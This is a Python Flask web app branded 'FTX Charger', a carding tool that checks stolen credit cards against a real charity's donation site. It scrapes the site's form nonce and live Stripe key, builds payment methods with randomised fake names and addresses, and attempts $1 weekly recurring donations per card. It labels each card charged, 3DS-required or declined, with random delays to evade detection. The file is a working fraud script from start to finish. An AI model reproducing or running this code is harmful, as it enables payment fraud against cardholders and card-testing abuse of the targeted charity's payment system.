# app.py - Vercel safe minimal + your checker (no global network calls)

from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
import os
import re
import time
import random
import threading
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = b'change-this-secret-key-2026'

# ─── STATE ──────────────────────────────────────────────────────────────
check_results = []
is_checking = False
stop_flag = False
total_cards = 0
lock = threading.Lock()

def random_name():
    return random.choice(["Ahmed","Mohamed","Sarah","Omar"]), random.choice(["Khalil","Abdullah","Smith","Johnson"])

def random_address():
    return "New York", "NY", f"{random.randint(100,9999)} Main St", "10001"

def random_email():
    return f"test{random.randint(100000,999999)}@gmail.com"

def check_ccs(cc_lines):
    global is_checking, stop_flag, total_cards

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36"

    with lock:
        total_cards = len(cc_lines)
        check_results[:] = []
        is_checking = True
        stop_flag = False

    s = requests.Session()

    for idx, line in enumerate(cc_lines, 1):
        with lock:
            if stop_flag:
                check_results.append((idx, line.strip(), "STOPPED BY USER"))
                break

        line = line.strip()
        if '|' not in line:
            continue

        try:
            num, mm, yy, cvc = [x.strip() for x in line.split('|')]
            yy = yy[-2:]
        except:
            check_results.append((idx, line, "BAD FORMAT"))
            continue

        try:
            r = s.get("https://pipelineforchangefoundation.com/donate/", headers={"User-Agent": ua}, timeout=15)
            if r.status_code != 200:
                check_results.append((idx, line, "SITE DOWN"))
                continue

            soup = BeautifulSoup(r.text, "html.parser")

            formid = soup.find("input", {"name": "charitable_form_id"})
            nonce  = soup.find("input", {"name": "_charitable_donation_nonce"})
            cap    = soup.find("input", {"name": "campaign_id"})

            if not (formid and nonce and cap):
                check_results.append((idx, line, "FORM FIELDS MISSING"))
                continue

            formid = formid["value"]
            nonce  = nonce["value"]
            cap    = cap["value"]

            pk_live_match = re.search(r'"key":"(pk_live_[^"]+)"', r.text)
            if not pk_live_match:
                check_results.append((idx, line, "NO STRIPE KEY"))
                continue
            pk_live = pk_live_match.group(1)

        except Exception as e:
            check_results.append((idx, line, f"PAGE ERROR - {str(e)[:60]}"))
            continue

        fn, ln = random_name()
        city, state, addr, zipc = random_address()
        email = random_email()

        pm_data = {
            "type": "card",
            "billing_details[name]": f"{fn} {ln}",
            "billing_details[email]": email,
            "billing_details[address][city]": city,
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": addr,
            "billing_details[address][postal_code]": zipc,
            "billing_details[address][state]": state,
            "card[number]": num,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "key": pk_live,
        }

        try:
            pm = requests.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers={"User-Agent": ua}, timeout=12)
            pm.raise_for_status()
            pm_id = pm.json()["id"]
        except Exception as e:
            check_results.append((idx, line, f"PM ERROR - {str(e)[:60]}"))
            continue

        donation_data = {
            "charitable_form_id": formid,
            formid: "",
            "_charitable_donation_nonce": nonce,
            "campaign_id": cap,
            "description": "Donate 1$",
            "ID": "742502",
            "recurring_donation": "yes",
            "donation_amount": "recurring-custom",
            "custom_recurring_donation_amount": "1.00",
            "recurring_donation_period": "week",
            "first_name": fn,
            "last_name": ln,
            "email": email,
            "address": addr,
            "city": city,
            "state": state,
            "postcode": zipc,
            "country": "US",
            "gateway": "stripe",
            "stripe_payment_method": pm_id,
            "action": "make_donation",
        }

        try:
            resp = s.post(
                "https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php",
                data=donation_data,
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://pipelineforchangefoundation.com/donate/",
                },
                timeout=20
            )

            txt = resp.text.lower()
            if "thank you" in txt or "successfully" in txt:
                status = "CHARGED 1.00$ ✅"
            elif "requires_action" in txt:
                status = "3DS REQUIRED"
            else:
                status = "DECLINED / ERROR"
        except Exception as e:
            status = f"REQUEST ERROR - {str(e)[:60]}"

        check_results.append((idx, line, status))
        time.sleep(random.uniform(4, 9))

    with lock:
        is_checking = False

# ─── SIMPLE HTML ────────────────────────────────────────────────────────

LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {background:#000;color:#0f0;font-family:monospace;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;}
    .box {background:#111;padding:40px;border:2px solid #0f0;border-radius:10px;text-align:center;max-width:400px;}
    input {width:100%;padding:12px;margin:12px 0;background:#000;color:#0f0;border:1px solid #0f0;}
    button {width:100%;padding:14px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;}
    button:hover {background:#0c0;}
    .err {color:#f00;margin-top:15px;}
  </style>
</head>
<body>
  <div class="box">
    <h2>FTX PANEL</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">LOGIN</button>
    </form>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
  </div>
</body>
</html>"""

PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FTX Charger</title>
  <style>
    body {background:#000;color:#0f0;font-family:monospace;margin:0;padding:20px;}
    h1 {color:#0f0;text-align:center;}
    .card {background:#111;border:1px solid #0f0;border-radius:8px;padding:20px;margin:20px auto;max-width:900px;}
    input[type=file] {width:100%;padding:12px;background:#000;color:#0f0;border:1px solid #0f0;margin-bottom:15px;}
    button {padding:12px 30px;background:#0f0;color:#000;border:none;border-radius:6px;cursor:pointer;font-weight:bold;}
    button.stop {background:#f00;color:white;}
    textarea {width:100%;height:300px;background:#000;color:#0f0;border:1px solid #0f0;font-family:monospace;padding:12px;margin:15px 0;}
    table {width:100%;border-collapse:collapse;}
    th,td {padding:10px;border:1px solid #0f0;}
    th {background:#0a0;color:#000;}
    .ok {color:#0f0;}
    .bad {color:#f00;}
  </style>
</head>
<body>
  <h1>FTX CHARGER</h1>

  <div class="card">
    {% if not is_checking %}
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="ccfile" accept=".txt" required>
      <button type="submit">START CHECK</button>
    </form>
    {% else %}
    <p>CHECKING {{ len(check_results) }} / {{ total_cards }}</p>
    <button class="stop" onclick="stopNow()">STOP</button>
    {% endif %}
  </div>

  {% if check_results %}
  <div class="card">
    <button onclick="copy()">Copy All</button>
    <textarea id="out">{{ '\n'.join([f"{i} | {cc} | {res}" for i,cc,res in check_results]) }}</textarea>

    <table>
      <tr><th>#</th><th>CC</th><th>Result</th></tr>
      {% for i,cc,res in check_results %}
      <tr>
        <td>{{ i }}</td>
        <td>{{ cc }}</td>
        <td class="{% if 'CHARGED' in res %}ok{% else %}bad{% endif %}">{{ res }}</td>
      </tr>
      {% endfor %}
    </table>
  </div>
  {% endif %}

  <script>
    function copy() {
      navigator.clipboard.writeText(document.getElementById("out").value);
      alert("Copied");
    }
    function stopNow() {
      if (confirm("Stop checking?")) {
        fetch("/stop", {method:"POST"}).then(() => location.reload());
      }
    }
    {% if is_checking %}setTimeout(() => location.reload(), 7000);{% endif %}
  </script>
</body>
</html>"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == "admin" and p == "123":
            session["logged"] = True
            return redirect("/panel")
        return render_template_string(LOGIN_HTML, error="Wrong")
    return render_template_string(LOGIN_HTML)

@app.route("/panel", methods=["GET", "POST"])
def panel():
    global is_checking, stop_flag

    if not session.get("logged"):
        return redirect("/")

    if request.method == "POST" and not is_checking:
        file = request.files.get("ccfile")
        if file and file.filename.lower().endswith(".txt"):
            try:
                content = file.read().decode("utf-8", errors="ignore")
                lines = [l.strip() for l in content.splitlines() if '|' in l]
                if lines:
                    threading.Thread(target=check_ccs, args=(lines,), daemon=True).start()
            except Exception as e:
                print("Upload error:", str(e))

    return render_template_string(PANEL_HTML,
                                 is_checking=is_checking,
                                 check_results=check_results,
                                 total_cards=total_cards)

@app.route("/stop", methods=["POST"])
def stop():
    global stop_flag
    with lock:
        stop_flag = True
    return jsonify({"ok": True})

# NO if __name__ block here for Vercel
# For local run you can add it manually:
# if __name__ == '__main__':
#     app.run(host="0.0.0.0", port=5000)
